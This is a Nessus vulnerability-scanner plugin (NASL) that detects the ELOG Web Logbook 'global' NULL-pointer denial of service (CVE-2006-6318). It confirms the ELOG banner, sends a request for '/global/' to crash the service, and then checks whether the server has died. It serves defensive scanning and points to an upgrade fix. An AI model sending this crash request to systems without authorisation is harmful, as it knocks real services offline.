#
#	This script was written by Justin Seitz <jms@bughunter.ca>
#	Per Justin : GPLv2
#


include("compat.inc");

if(description) {
	script_id(23652);
	script_version("$Revision: 1.12 $");

	script_cve_id("CVE-2006-6318");
	script_bugtraq_id(21028);
	script_osvdb_id(30272);

	name["english"] = "ELOG Web LogBook global Denial of Service";
	summary["english"] = "Tries to crash the remote service.";
	family["english"] = "CGI abuses";

	script_name(english:name["english"]);
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service issue." );
 script_set_attribute(attribute:"description", value:
"The remote web server is identified as ELOG Web Logbook, an open
source blogging software. 

The version of ELOG Web Logbook installed on the remote host is
vulnerable to a denial of service attack by requesting '/global' or
any logbook with 'global' in its name.  When a request like this is
received, a NULL pointer dereference occurs, leading to a crash of the
service." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2006/Nov/196" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?67c4b2ac" );
 script_set_attribute(attribute:"see_also", value:"http://midas.psi.ch/elogs/Forum/2053" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ELOG version 2.6.2-7 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/11/20");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/11/09");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

	script_summary(english:summary["english"]);

	script_category(ACT_DENIAL);
	script_copyright(english:"This script is Copyright (C) 2006-2011 Justin Seitz");

	script_family(english:family["english"]);

	script_dependencies("http_version.nasl");
	script_require_ports("Services/www", 8080);
	exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

#
#
#	Verify we can talk to the web server either on port 8080 (the default).
#
#

port = get_http_port(default:8080);
if(!get_port_state(port)) exit(0, "TCP port "+port+" is closed.");
if (http_is_dead(port:port)) exit(1, "The web server on port "+port+" is already dead.");

#
#
#	Verify its ELOG and send the DOS if it is.
#
#

banner = get_http_banner(port:port);
if (isnull(banner))
  exit(1, "Cannot read the HTTP banner on port "+port+".");
if ("Server: ELOG HTTP" >!< banner)
 exit(0, "The web server on port "+port+" is not ELOG.");

	uri = "/global/";
	attackreq = http_get(port:port, item:uri);
	attackres = http_send_recv(port:port, data:attackreq);

	#
	#
	#	Try to connect to the web server, if you can't you know its busted.
	#
	#

	if(http_is_dead(port:port))
		security_warning(port);	

